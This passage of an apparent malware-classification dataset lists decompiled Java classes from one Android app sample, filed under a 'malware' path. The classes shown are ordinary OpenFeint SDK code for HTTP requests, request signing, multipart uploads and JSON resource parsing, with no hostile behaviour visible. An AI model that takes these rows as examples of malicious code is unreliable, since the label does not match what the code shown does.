IRawRequestDelegate mDelegate){     this.mDelegate=mDelegate;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\GzipDecompressingEntity.code","private static class GzipDecompressingEntity extends HttpEntityWrapper {   public GzipDecompressingEntity(  HttpEntity entity){     super(entity);   }   @Override public InputStream getContent() throws IOException, IllegalStateException {     InputStream wrappedin=this.wrappedEntity.getContent();     return new GZIPInputStream(wrappedin);   }   @Override public long getContentLength(){     return -1L;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\IRawRequestDelegate.code","public interface IRawRequestDelegate {   void onResponse(  int i,  String str); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\JSONContentRequest.code","public abstract class JSONContentRequest extends BaseRequest {   private static final String CONTENT_TYPE=""application/json"";   public static final String DESIRED_RESPONSE_PREFIX=""application/json;"";   public static ServerException notJSONError(  int responseCode){     return new ServerException(""ServerError"",String.format(OpenFeintInternal.getRString(R.string.of_server_error_code_format),Integer.valueOf(responseCode)));   }   public JSONContentRequest(){   }   @Override public HttpUriRequest generateRequest(){     HttpUriRequest req=super.generateRequest();     req.addHeader(""Accept"",CONTENT_TYPE);     return req;   }   public boolean isResponseJSON(){     String responseType=getResponseType();     return responseType != null && responseType.startsWith(DESIRED_RESPONSE_PREFIX);   }   public JSONContentRequest(  OrderedArgList args){     super(args);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\JSONRequest.code","public abstract class JSONRequest extends JSONContentRequest {   public void onSuccess(  Object responseBody){   }   public void onFailure(  String exceptionMessage){   }   public JSONRequest(){   }   public JSONRequest(  OrderedArgList args){     super(args);   }   @Override public void onResponse(  int responseCode,  byte[] bodyStream){     if (bodyStream.length == 0 || ((bodyStream.length == 1 && bodyStream[0] == 32) || isResponseJSON())) {       Object responseBody=parseJson(bodyStream);       onResponse(responseCode,responseBody);     }  else {       onResponse(responseCode,notJSONError(responseCode));     }   }   protected Object parseJson(  byte[] bodyStream){     return Util.getObjFromJson(bodyStream);   }   protected void onResponse(  int responseCode,  Object responseBody){     if (200 <= responseCode && responseCode < 300 && (responseBody == null || !(responseBody instanceof ServerException))) {       onSuccess(responseBody);     }  else {       onFailure(responseBody);     }   }   public void onFailure(  Object responseBody){     String exceptionMessage=OpenFeintInternal.getRString(R.string.of_unknown_server_error);     if (responseBody != null && (responseBody instanceof ServerException)) {       ServerException e=(ServerException)responseBody;       exceptionMessage=e.message;       if (e.needsDeveloperAttention) {         OpenFeintInternal.log(""ServerException"",exceptionMessage);         OpenFeintInternal.getInstance().displayErrorDialog(exceptionMessage);       }     }     onFailure(exceptionMessage);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\NVPComparator.code","public static class NVPComparator implements Comparator<NameValuePair> {   NVPComparator(){   }   @Override public int compare(  NameValuePair a,  NameValuePair b){     int r=a.getName().compareTo(b.getName());     return r == 0 ? a.getValue().compareTo(b.getValue()) : r;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\OrderedArgList.code","public class OrderedArgList {   ArrayList<NameValuePair> mArgs=new ArrayList<>();   public OrderedArgList(){   }   public NameValuePair remove(  String key){     Iterator<NameValuePair> it=this.mArgs.iterator();     while (it.hasNext()) {       NameValuePair p=it.next();       if (p.getName().equals(key)) {         this.mArgs.remove(p);         return p;       }     }     return null;   }   public OrderedArgList(  Map<String,Object> args){     accumulate(args,(String)null);   }   public OrderedArgList(  JSONObject j){     try {       accumulate(j,(String)null);     }  catch (    JSONException e) {     }   }   public OrderedArgList(  OrderedArgList rhs){     this.mArgs.addAll(rhs.getArgs());   }   public List<NameValuePair> getArgs(){     return this.mArgs;   }   public List<NameValuePair> getArgsSorted(){     List<NameValuePair> s=new ArrayList<>();     s.addAll(this.mArgs);     Collections.sort(s,new NVPComparator());     return s;   }   public void put(  String k,  String v){     this.mArgs.add(new BasicNameValuePair(k,v));   }   public String getArgString(){     return getArgString(getArgs());   }   public String getArgStringSorted(){     return getArgString(getArgsSorted());   }   private static String getArgString(  List<NameValuePair> pairs){     StringBuilder accumulator=null;     PercentEscaper escaper=new PercentEscaper(PercentEscaper.SAFECHARS_URLENCODER,true);     for (    NameValuePair nvp : pairs) {       if (accumulator == null) {         accumulator=new StringBuilder();       }  else {         accumulator.append('&');       }       accumulator.append(escaper.escape(nvp.getName()));       accumulator.append('=');       if (nvp.getValue() != null) {         accumulator.append(escaper.escape(nvp.getValue()));       }     }     if (accumulator == null) {       return null;     }     return accumulator.toString();   }   private void accumulate(  JSONArray jsonArray,  String fieldName) throws JSONException {     int size=jsonArray.length();     for (int arrayIndex=0; arrayIndex < size; arrayIndex++) {       Object arrayEntry=jsonArray.get(arrayIndex);       if (arrayEntry instanceof JSONObject) {         accumulate((JSONObject)arrayEntry,fieldName);       }  else       if (arrayEntry instanceof JSONArray) {         accumulate((JSONArray)arrayEntry,fieldName);       }  else {         put(fieldName,arrayEntry.toString());       }     }   }   private void accumulate(  final JSONObject jsonObject,  String prefix) throws JSONException {     Iterable<String> objectIteratable=new Iterable<String>(){       @Override public Iterator<String> iterator(){         return jsonObject.keys();       }     } ;     for (    String fieldName : objectIteratable) {       Object fieldObject=jsonObject.get(fieldName);       String subKey=prefix == null ? fieldName : String.valueOf(prefix) + ""["" + fieldName+ ""]"";       if (fieldObject instanceof JSONObject) {         accumulate((JSONObject)fieldObject,subKey);       }  else       if (fieldObject instanceof JSONArray) {         accumulate((JSONArray)fieldObject,subKey);       }  else {         put(subKey,fieldObject.toString());       }     }   }   private void accumulate(  Map<String,Object> args,  String prefix){     for (    Map.Entry<String,Object> me : args.entrySet()) {       String k=me.getKey();       Object v=me.getValue();       String subKey=prefix == null ? k : String.valueOf(prefix) + ""["" + k+ ""]"";       if (v instanceof Map) {         accumulate(stringObjectMap(v),subKey);       }  else {         put(subKey,v.toString());       }     }   }   private final Map<String,Object> stringObjectMap(  Object v){     return (Map)v;   } public static class NVPComparator implements Comparator<NameValuePair> {     NVPComparator(){     }     @Override public int compare(    NameValuePair a,    NameValuePair b){       int r=a.getName().compareTo(b.getName());       return r == 0 ? a.getValue().compareTo(b.getValue()) : r;     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\RawRequest.code","public abstract class RawRequest extends JSONRequest {   private IRawRequestDelegate mDelegate;   public RawRequest(){   }   public RawRequest(  OrderedArgList args){     super(args);   }   @Override public void onResponse(  int responseCode,  byte[] body){     String respText;     try {       super.onResponse(responseCode,body);       if (this.mDelegate != null) {         if (!isResponseJSON()) {           respText=notJSONError(responseCode).generate();         }  else {           respText=new String(body);         }         this.mDelegate.onResponse(responseCode,respText);       }     }  catch (    IllegalStateException e) {       e.printStackTrace();     }   }   public void setDelegate(  IRawRequestDelegate mDelegate){     this.mDelegate=mDelegate;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\Signer.code","public class Signer {   private String mAccessToken;   private String mKey;   private String mSecret;   private String mSigningKey;   public String getKey(){     return this.mKey;   }   public Signer(  String key,  String secret){     this.mKey=key;     this.mSecret=secret;     this.mSigningKey=String.valueOf(this.mSecret) + ""&"";   }   public void setAccessToken(  String token,  String tokenSecret){     this.mAccessToken=token;     this.mSigningKey=String.valueOf(this.mSecret) + ""&"" + tokenSecret;   }   public String sign(  String path,  String method,  long secondsSinceEpoch,  OrderedArgList unsignedParams){     if (this.mAccessToken != null) {       unsignedParams.put(""token"",this.mAccessToken);     }     StringBuilder sigbase=new StringBuilder();     sigbase.append(path);     sigbase.append('+');     sigbase.append(this.mSecret);     sigbase.append('+');     sigbase.append(method);     sigbase.append('+');     String argString=unsignedParams.getArgString();     sigbase.append(argString == null ? """" : argString);     try {       SecretKeySpec key=new SecretKeySpec(this.mSigningKey.getBytes(""UTF-8""),""HmacSHA1"");       Mac mac=Mac.getInstance(""HmacSHA1"");       mac.init(key);       byte[] bytes=mac.doFinal(sigbase.toString().getBytes(""UTF-8""));       return new String(Base64.encodeBase64(bytes)).replace(""\r\n"","""");     }  catch (    UnsupportedEncodingException|InvalidKeyException|NoSuchAlgorithmException e) {       return null;     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request.multipart\ByteArrayPartSource.code","public class ByteArrayPartSource implements PartSource {   private byte[] bytes;   private String fileName;   public ByteArrayPartSource(  String fileName,  byte[] bytes){     this.fileName=fileName;     this.bytes=bytes;   }   @Override public long getLength(){     return this.bytes.length;   }   @Override public String getFileName(){     return this.fileName;   }   @Override public InputStream createInputStream() throws IOException {     return new ByteArrayInputStream(this.bytes);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request.multipart\EncodingUtil.code","public class EncodingUtil {   public static byte[] getAsciiBytes(  String data){     if (data == null) {       throw new IllegalArgumentException(""Parameter may not be null"");     }     try {       return data.getBytes(""US-ASCII"");     }  catch (    UnsupportedEncodingException e) {       throw new RuntimeException(""HttpClient requires ASCII support"");     }   }   public static String getAsciiString(  byte[] data,  int offset,  int length){     if (data == null) {       throw new IllegalArgumentException(""Parameter may not be null"");     }     try {       return new String(data,offset,length,""US-ASCII"");     }  catch (    UnsupportedEncodingException e) {       throw new RuntimeException(""HttpClient requires ASCII support"");     }   }   public static String getAsciiString(  byte[] data){     return getAsciiString(data,0,data.length);   }   public static byte[] getBytes(  String data,  String charset){     if (data == null) {       throw new IllegalArgumentException(""data may not be null"");     }     if (charset == null || charset.length() == 0) {       throw new IllegalArgumentException(""charset may not be null or empty"");     }     try {       return data.getBytes(charset);     }  catch (    UnsupportedEncodingException e) {       return data.getBytes();     }   }   private EncodingUtil(){   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request.multipart\FilePart.code","public class FilePart extends PartBase {   public static final String DEFAULT_CHARSET=""ISO-8859-1"";   public static final String DEFAULT_CONTENT_TYPE=""application/octet-stream"";   public static final String DEFAULT_TRANSFER_ENCODING=""binary"";   protected static final String FILE_NAME=""; filename="";   private static final byte[] FILE_NAME_BYTES=EncodingUtil.getAsciiBytes(FILE_NAME);   private PartSource source;   public FilePart(  String name,  PartSource partSource,  String contentType,  String charset){     super(name,contentType == null ? DEFAULT_CONTENT_TYPE : contentType,charset == null ? ""ISO-8859-1"" : charset,DEFAULT_TRANSFER_ENCODING);     if (partSource == null) {       throw new IllegalArgumentException(""Source may not be null"");     }     this.source=partSource;   }   public FilePart(  String name,  PartSource partSource){     this(name,partSource,(String)null,(String)null);   }   public FilePart(  String name,  File file) throws FileNotFoundException {     this(name,new FilePartSource(file),(String)null,(String)null);   }   public FilePart(  String name,  File file,  String contentType,  String charset) throws FileNotFoundException {     this(name,new FilePartSource(file),contentType,charset);   }   public FilePart(  String name,  String fileName,  File file) throws FileNotFoundException {     this(name,new FilePartSource(fileName,file),(String)null,(String)null);   }   public FilePart(  String name,  String fileName,  File file,  String contentType,  String charset) throws FileNotFoundException {     this(name,new FilePartSource(fileName,file),contentType,charset);   }   @Override public void sendDispositionHeader(  OutputStream out) throws IOException {     super.sendDispositionHeader(out);     String filename=this.source.getFileName();     if (filename != null) {       out.write(FILE_NAME_BYTES);       out.write(QUOTE_BYTES);       out.write(EncodingUtil.getAsciiBytes(filename));       out.write(QUOTE_BYTES);     }   }   @Override protected void sendData(  OutputStream out) throws IOException {     if (lengthOfData() != 0) {       byte[] tmp=new byte[4096];       InputStream instream=this.source.createInputStream();       while (true) {         try {           int len=instream.read(tmp);           if (len >= 0) {             out.write(tmp,0,len);           }  else {             return;           }         }   finally {           instream.close();         }       }     }   }   protected PartSource getSource(){     return this.source;   }   @Override protected long lengthOfData() throws IOException {     return this.source.getLength();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request.multipart\FilePartSource.code","public class FilePartSource implements PartSource {   private File file;   private String fileName;   public FilePartSource(  File file) throws FileNotFoundException {     this.file=null;     this.fileName=null;     this.file=file;     if (file != null) {       if (!file.isFile()) {         throw new FileNotFoundException(""File is not a normal file."");       }       if (!file.canRead()) {         throw new FileNotFoundException(""File is not readable."");       }       this.fileName=file.getName();     }   }   public FilePartSource(  String fileName,  File file) throws FileNotFoundException {     this(file);     if (fileName != null) {       this.fileName=fileName;     }   }   @Override public long getLength(){     if (this.file != null) {       return this.file.length();     }     return 0L;   }   @Override public String getFileName(){     return this.fileName == null ? ""noname"" : this.fileName;   }   @Override public InputStream createInputStream() throws IOException {     return this.file != null ? new FileInputStream(this.file) : new ByteArrayInputStream(new byte[0]);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request.multipart\MultipartHttpEntity.code","public class MultipartHttpEntity implements HttpEntity {   private static byte[] MULTIPART_CHARS=EncodingUtil.getAsciiBytes(""-_1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"");   private static final String MULTIPART_FORM_CONTENT_TYPE=""multipart/form-data"";   private static final String TAG=""MultipartRequestEntity"";   private byte[] multipartBoundary;   protected Part[] parts;   private static byte[] generateMultipartBoundary(){     Random rand=new Random();     byte[] bytes=new byte[rand.nextInt(11) + 30];     for (int i=0; i < bytes.length; i++) {       bytes[i]=MULTIPART_CHARS[rand.nextInt(MULTIPART_CHARS.length)];     }     return bytes;   }   public MultipartHttpEntity(  Part[] parts){     if (parts == null) {       throw new IllegalArgumentException(""parts cannot be null"");     }     this.parts=parts;   }   protected byte[] getMultipartBoundary(){     if (this.multipartBoundary == null) {       this.multipartBoundary=generateMultipartBoundary();     }     return this.multipartBoundary;   }   @Override public boolean isRepeatable(){     for (int i=0; i < this.parts.length; i++) {       if (!this.parts[i].isRepeatable()) {         return false;       }     }     return true;   }   @Override public void writeTo(  OutputStream out) throws IOException {     Part.sendParts(out,this.parts,getMultipartBoundary());   }   @Override public long getContentLength(){     try {       return Part.getLengthOfParts(this.parts,getMultipartBoundary());     }  catch (    Exception e) {       OpenFeintInternal.log(TAG,""An exception occurred while getting the length of the parts"");       return 0L;     }   }   @Override public Header getContentType(){     StringBuffer buffer=new StringBuffer(MULTIPART_FORM_CONTENT_TYPE);     buffer.append(""; boundary="");     buffer.append(EncodingUtil.getAsciiString(getMultipartBoundary()));     return new BasicHeader(""Content-Type"",buffer.toString());   }   @Override public void consumeContent() throws IOException {     throw new UnsupportedOperationException();   }   @Override public InputStream getContent() throws IOException, IllegalStateException {     throw new UnsupportedOperationException();   }   @Override public Header getContentEncoding(){     return new BasicHeader(""Content-Encoding"",""text/html; charset=UTF-8"");   }   @Override public boolean isChunked(){     return getContentLength() < 0;   }   @Override public boolean isStreaming(){     return false;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request.multipart\Part.code","public abstract class Part {   private byte[] boundaryBytes;   protected static final String BOUNDARY=""----------------ULTRASONIC_CUPCAKES___-__-"";   protected static final byte[] BOUNDARY_BYTES=EncodingUtil.getAsciiBytes(BOUNDARY);   private static final byte[] DEFAULT_BOUNDARY_BYTES=BOUNDARY_BYTES;   protected static final String CRLF=""\r\n"";   protected static final byte[] CRLF_BYTES=EncodingUtil.getAsciiBytes(CRLF);   protected static final String QUOTE=""\"""";   protected static final byte[] QUOTE_BYTES=EncodingUtil.getAsciiBytes(QUOTE);   protected static final String EXTRA=""--"";   protected static final byte[] EXTRA_BYTES=EncodingUtil.getAsciiBytes(EXTRA);   protected static final String CONTENT_DISPOSITION=""Content-Disposition: form-data; name="";   protected static final byte[] CONTENT_DISPOSITION_BYTES=EncodingUtil.getAsciiBytes(CONTENT_DISPOSITION);   protected static final String CONTENT_TYPE=""Content-Type: "";   protected static final byte[] CONTENT_TYPE_BYTES=EncodingUtil.getAsciiBytes(CONTENT_TYPE);   protected static final String CHARSET=""; charset="";   protected static final byte[] CHARSET_BYTES=EncodingUtil.getAsciiBytes(CHARSET);   protected static final String CONTENT_TRANSFER_ENCODING=""Content-Transfer-Encoding: "";   protected static final byte[] CONTENT_TRANSFER_ENCODING_BYTES=EncodingUtil.getAsciiBytes(CONTENT_TRANSFER_ENCODING);   public abstract String getCharSet();   public abstract String getContentType();   public abstract String getName();   public abstract String getTransferEncoding();   protected abstract long lengthOfData() throws IOException ;   protected abstract void sendData(  OutputStream outputStream) throws IOException ;   public static String getBoundary(){     return BOUNDARY;   }   protected byte[] getPartBoundary(){     return this.boundaryBytes == null ? DEFAULT_BOUNDARY_BYTES : this.boundaryBytes;   }   void setPartBoundary(  byte[] boundaryBytes){     this.boundaryBytes=boundaryBytes;   }   public boolean isRepeatable(){     return true;   }   protected void sendStart(  OutputStream out) throws IOException {     out.write(EXTRA_BYTES);     out.write(getPartBoundary());     out.write(CRLF_BYTES);   }   public void sendDispositionHeader(  OutputStream out) throws IOException {     out.write(CONTENT_DISPOSITION_BYTES);     out.write(QUOTE_BYTES);     out.write(EncodingUtil.getAsciiBytes(getName()));     out.write(QUOTE_BYTES);   }   protected void sendContentTypeHeader(  OutputStream out) throws IOException {     String contentType=getContentType();     if (contentType != null) {       out.write(CRLF_BYTES);       out.write(CONTENT_TYPE_BYTES);       out.write(EncodingUtil.getAsciiBytes(contentType));       String charSet=getCharSet();       if (charSet != null) {         out.write(CHARSET_BYTES);         out.write(EncodingUtil.getAsciiBytes(charSet));       }     }   }   protected void sendTransferEncodingHeader(  OutputStream out) throws IOException {     String transferEncoding=getTransferEncoding();     if (transferEncoding != null) {       out.write(CRLF_BYTES);       out.write(CONTENT_TRANSFER_ENCODING_BYTES);       out.write(EncodingUtil.getAsciiBytes(transferEncoding));     }   }   protected void sendEndOfHeader(  OutputStream out) throws IOException {     out.write(CRLF_BYTES);     out.write(CRLF_BYTES);   }   protected void sendEnd(  OutputStream out) throws IOException {     out.write(CRLF_BYTES);   }   public void send(  OutputStream out) throws IOException {     sendStart(out);     sendDispositionHeader(out);     sendContentTypeHeader(out);     sendTransferEncodingHeader(out);     sendEndOfHeader(out);     sendData(out);     sendEnd(out);   }   public long length() throws IOException {     if (lengthOfData() < 0) {       return -1L;     }     ByteArrayOutputStream overhead=new ByteArrayOutputStream();     sendStart(overhead);     sendDispositionHeader(overhead);     sendContentTypeHeader(overhead);     sendTransferEncodingHeader(overhead);     sendEndOfHeader(overhead);     sendEnd(overhead);     return overhead.size() + lengthOfData();   }   public String toString(){     return getName();   }   public static void sendParts(  OutputStream out,  Part[] parts) throws IOException {     sendParts(out,parts,DEFAULT_BOUNDARY_BYTES);   }   public static void sendParts(  OutputStream out,  Part[] parts,  byte[] partBoundary) throws IOException {     if (parts == null) {       throw new IllegalArgumentException(""Parts may not be null"");     }     if (partBoundary == null || partBoundary.length == 0) {       throw new IllegalArgumentException(""partBoundary may not be empty"");     }     for (int i=0; i < parts.length; i++) {       parts[i].setPartBoundary(partBoundary);       parts[i].send(out);     }     out.write(EXTRA_BYTES);     out.write(partBoundary);     out.write(EXTRA_BYTES);     out.write(CRLF_BYTES);   }   public static long getLengthOfParts(  Part[] parts) throws IOException {     return getLengthOfParts(parts,DEFAULT_BOUNDARY_BYTES);   }   public static long getLengthOfParts(  Part[] parts,  byte[] partBoundary) throws IOException {     if (parts == null) {       throw new IllegalArgumentException(""Parts may not be null"");     }     long total=0;     for (int i=0; i < parts.length; i++) {       parts[i].setPartBoundary(partBoundary);       long l=parts[i].length();       if (l < 0) {         return -1L;       }       total+=l;     }     return total + EXTRA_BYTES.length + partBoundary.length+ EXTRA_BYTES.length+ CRLF_BYTES.length;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request.multipart\PartBase.code","public abstract class PartBase extends Part {   private String charSet;   private String contentType;   private String name;   private String transferEncoding;   public PartBase(  String name,  String contentType,  String charSet,  String transferEncoding){     if (name == null) {       throw new IllegalArgumentException(""Name must not be null"");     }     this.name=name;     this.contentType=contentType;     this.charSet=charSet;     this.transferEncoding=transferEncoding;   }   @Override public String getName(){     return this.name;   }   @Override public String getContentType(){     return this.contentType;   }   @Override public String getCharSet(){     return this.charSet;   }   @Override public String getTransferEncoding(){     return this.transferEncoding;   }   public void setCharSet(  String charSet){     this.charSet=charSet;   }   public void setContentType(  String contentType){     this.contentType=contentType;   }   public void setName(  String name){     if (name == null) {       throw new IllegalArgumentException(""Name must not be null"");     }     this.name=name;   }   public void setTransferEncoding(  String transferEncoding){     this.transferEncoding=transferEncoding;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request.multipart\PartSource.code","public interface PartSource {   InputStream createInputStream() throws IOException ;   String getFileName();   long getLength(); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request.multipart\StringPart.code","public class StringPart extends PartBase {   public static final String DEFAULT_CHARSET=""UTF-8"";   public static final String DEFAULT_CONTENT_TYPE=""text/html"";   public static final String DEFAULT_TRANSFER_ENCODING=""8bit"";   private byte[] content;   private String value;   public StringPart(  String name,  String value,  String charset){     super(name,DEFAULT_CONTENT_TYPE,charset == null ? ""UTF-8"" : charset,DEFAULT_TRANSFER_ENCODING);     if (value == null) {       throw new IllegalArgumentException(""Value may not be null"");     }     if (value.indexOf(0) != -1) {       throw new IllegalArgumentException(""NULs may not be present in string parts"");     }     this.value=value;   }   public StringPart(  String name,  String value){     this(name,value,null);   }   private byte[] getContent(){     if (this.content == null) {       this.content=EncodingUtil.getBytes(this.value,getCharSet());     }     return this.content;   }   @Override protected void sendData(  OutputStream out) throws IOException {     out.write(getContent());   }   @Override protected long lengthOfData() throws IOException {     return getContent().length;   }   @Override public void setCharSet(  String charSet){     super.setCharSet(charSet);     this.content=null;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.resource\ArrayResourceProperty.code","public abstract class ArrayResourceProperty extends ResourceProperty {   private Class<? extends Resource> mElementType;   public abstract List<? extends Resource> get(  Resource resource);   public abstract void set(  Resource resource,  List<?> list);   public ArrayResourceProperty(  Class<? extends Resource> elementType){     this.mElementType=elementType;   }   public Class<? extends Resource> elementType(){     return this.mElementType;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.resource\BlobUploadParameters.code","public class BlobUploadParameters extends Resource {   public String AWSAccessKeyId;   public String acl;   public String action;   public String key;   public String policy;   public String signature;   public static ResourceClass getResourceClass(){     ResourceClass klass=new ResourceClass(BlobUploadParameters.class,""blob_upload_parameters""){       @Override public Resource factory(){         return new BlobUploadParameters();       }     } ;     klass.mProperties.put(""action"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((BlobUploadParameters)obj).action;       }       @Override public void set(      Resource obj,      String val){         ((BlobUploadParameters)obj).action=val;       }     } );     klass.mProperties.put(""key"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((BlobUploadParameters)obj).key;       }       @Override public void set(      Resource obj,      String val){         ((BlobUploadParameters)obj).key=val;       }     } );     klass.mProperties.put(""AWSAccessKeyId"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((BlobUploadParameters)obj).AWSAccessKeyId;       }       @Override public void set(      Resource obj,      String val){         ((BlobUploadParameters)obj).AWSAccessKeyId=val;       }     } );     klass.mProperties.put(""acl"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((BlobUploadParameters)obj).acl;       }       @Override public void set(      Resource obj,      String val){         ((BlobUploadParameters)obj).acl=val;       }     } );     klass.mProperties.put(""policy"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((BlobUploadParameters)obj).policy;       }       @Override public void set(      Resource obj,      String val){         ((BlobUploadParameters)obj).policy=val;       }     } );     klass.mProperties.put(""signature"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((BlobUploadParameters)obj).signature;       }       @Override public void set(      Resource obj,      String val){         ((BlobUploadParameters)obj).signature=val;       }     } );     return klass;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.resource\BooleanResourceProperty.code","public abstract class BooleanResourceProperty extends PrimitiveResourceProperty {   public abstract boolean get(  Resource resource);   public abstract void set(  Resource resource,  boolean z);   @Override public void copy(  Resource lhs,  Resource rhs){     set(lhs,get(rhs));   }   @Override public void parse(  Resource obj,  JsonParser jp) throws JsonParseException, IOException {     if (jp.getCurrentToken() == JsonToken.VALUE_TRUE || jp.getText().equalsIgnoreCase(""true"") || jp.getText().equalsIgnoreCase(""1"") || jp.getText().equalsIgnoreCase(""YES"")) {       set(obj,true);     }  else {       set(obj,false);     }   }   @Override public void generate(  Resource obj,  JsonGenerator generator,  String key) throws JsonGenerationException, IOException {     generator.writeFieldName(key);     generator.writeBoolean(get(obj));   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.resource\DateResourceProperty.code","public abstract class DateResourceProperty extends PrimitiveResourceProperty {   public static DateFormat sDateParser=makeDateParser();   public abstract Date get(  Resource resource);   public abstract void set(  Resource resource,  Date date);   @Override public void copy(  Resource lhs,  Resource rhs){     set(lhs,get(rhs));   }   static DateFormat makeDateParser(){     DateFormat p=new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss"");     p.setTimeZone(TimeZone.getTimeZone(""UTC""));     return p;   }   @Override public void parse(  Resource obj,  JsonParser jp) throws JsonParseException, IOException {     String text=jp.getText();     if (text.equals(""null"")) {       set(obj,null);       return;     }     try {       set(obj,sDateParser.parse(text));     }  catch (    ParseException e) {       set(obj,null);     }   }   @Override public void generate(  Resource obj,  JsonGenerator generator,  String key) throws JsonGenerationException, IOException {     Date o=get(obj);     if (o != null) {       generator.writeFieldName(key);       generator.writeString(sDateParser.format(o));     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.resource\DoubleResourceProperty.code","public abstract class DoubleResourceProperty extends PrimitiveResourceProperty {   public abstract double get(  Resource resource);   public abstract void set(  Resource resource,  double d);   @Override public void copy(  Resource lhs,  Resource rhs){     set(lhs,get(rhs));   }   @Override public void parse(  Resource obj,  JsonParser jp) throws JsonParseException, IOException {     set(obj,jp.getDoubleValue());   }   @Override public void generate(  Resource obj,  JsonGenerator generator,  String key) throws JsonGenerationException, IOException {     generator.writeFieldName(key);     generator.writeNumber(get(obj));   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.resource\EnumResourceProperty.code","public abstract class EnumResourceProperty<T extends Enum<T>> extends PrimitiveResourceProperty {   Class<T> mEnumClass;   public abstract T get(  Resource resource);   public abstract void set(  Resource resource,  T t);   public EnumResourceProperty(  Class<T> enumClass){     this.mEnumClass=enumClass;   }   @Override public void copy(  Resource lhs,  Resource rhs){     set(lhs,get(rhs));   }   @Override public void parse(  Resource obj,  JsonParser jp) throws JsonParseException, IOException {     set(obj,Enum.valueOf(this.mEnumClass,jp.getText()));   }   @Override public void generate(  Resource obj,  JsonGenerator generator,  String key) throws JsonGenerationException, IOException {     T val=get(obj);     generator.writeFieldName(key);     generator.writeString(val.toString());   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.resource\FloatResourceProperty.code","public abstract class FloatResourceProperty extends PrimitiveResourceProperty {   public abstract float get(  Resource resource);   public abstract void set(  Resource resource,  float f);   @Override public void copy(  Resource lhs,  Resource rhs){     set(lhs,get(rhs));   }   @Override public void parse(  Resource obj,  JsonParser jp) throws JsonParseException, IOException {     try {       set(obj,jp.getFloatValue());     }  catch (    JsonParseException e) {     }   }   @Override public void generate(  Resource obj,  JsonGenerator generator,  String key) throws JsonGenerationException, IOException {     generator.writeFieldName(key);     generator.writeNumber(get(obj));   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.resource\HashIntResourceProperty.code","public abstract class HashIntResourceProperty extends ResourceProperty {   public abstract HashMap<String,Integer> get(  Resource resource);   public abstract void set(  Resource resource,  HashMap<String,Integer> hashMap); } "
